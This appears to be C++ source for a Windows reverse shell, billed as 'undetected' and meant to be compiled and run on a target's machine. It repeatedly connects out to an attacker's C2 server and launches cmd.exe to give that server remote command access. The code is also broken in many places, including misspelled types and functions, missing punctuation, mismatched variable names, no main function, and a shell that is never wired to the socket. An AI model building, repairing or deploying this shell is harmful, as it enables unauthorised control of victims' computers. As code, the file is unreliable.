// Created By benelhaj_younes (Do0pH2ck)
// Date: 2019/08/22
// Compile And Run On Target's Machine (Windows Machine)
// Undetected ReverseShell Made In C++


#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

#define DEFAULT_BUFLEN 1024

void RunShell(char* C2Server, int C2Port) {
  while(true) {
    Sleep(5000); /// 1000 = 1 Second

    SOCKET mySocket;
    sockaddr_in addr;
    WSDATA version;
    WSAStartup(MAKEWORD(2, 2) &version);
    mySocket = WSASocket(AF_INET, SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int) NULL, (unsigned int)NULL);
    addr.sin_family = AF_INET;


    addr.sin_addr.s_addr = inet_addr(C2Server);
    addr.sin_port = htons(C2PORT);

    // Connectiong to Proxy / IP proxy / C2host
    if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
      closesocket(mySocket);
      WSACleanup();
      continue;
    }
    else {
      char RecvData[DEFAULT_BUFLEN];
      memset(RecvData, 0, sizeof(RecvData));
      int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
      if (RecvCode <= 0) {
        closesocket(mySocket);
        WSACleanup();
        continue;
      }
      else {
        char Process[] = "cmd.exe"
        STARTUP sinfo;
        PROCESS_INFORMATION pinfo;
        memset(&sinfo, 0, sizeof(sinfo));
        sinfo.cb = sizeof(sinfo);
        sinfo.dwFlags = (STARTF_USESTDHANDLER | STARTF_USESHOWWINDOW);
        CreateProcess(NULL, Process, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
        WaitForSingleObject(pinfo.hProcess, INFINITE);
        CloseHandle(pinfo.hProcess);
        closeHandle(pinfo.hThread);

        memset(RecvData, 0, sizeof(RecvData));
        int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
        if (RecvCode <= 0) {
          closeSocket(mySocket);
          WSACleanup();
          continue;
        }
        if (strcmp(RecvData, "exit\n") == 0) {
          exit(0);
        }
      }
    }
  }
}
